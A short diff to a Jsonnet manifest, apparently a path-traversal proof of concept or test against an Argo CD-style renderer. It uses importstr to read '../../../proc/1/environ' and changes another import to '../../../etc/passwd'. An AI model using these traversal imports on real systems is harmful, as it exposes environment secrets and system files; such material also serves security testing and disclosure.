@@ -1,5 +1,5 @@
 local environ = importstr '../../../proc/1/environ';
-local cached_chart = importstr '../../../tmp/_argocd-repo/*';
+local cached_chart = importstr '../../../etc/passwd';
 
 {
   "apiVersion": "v1",
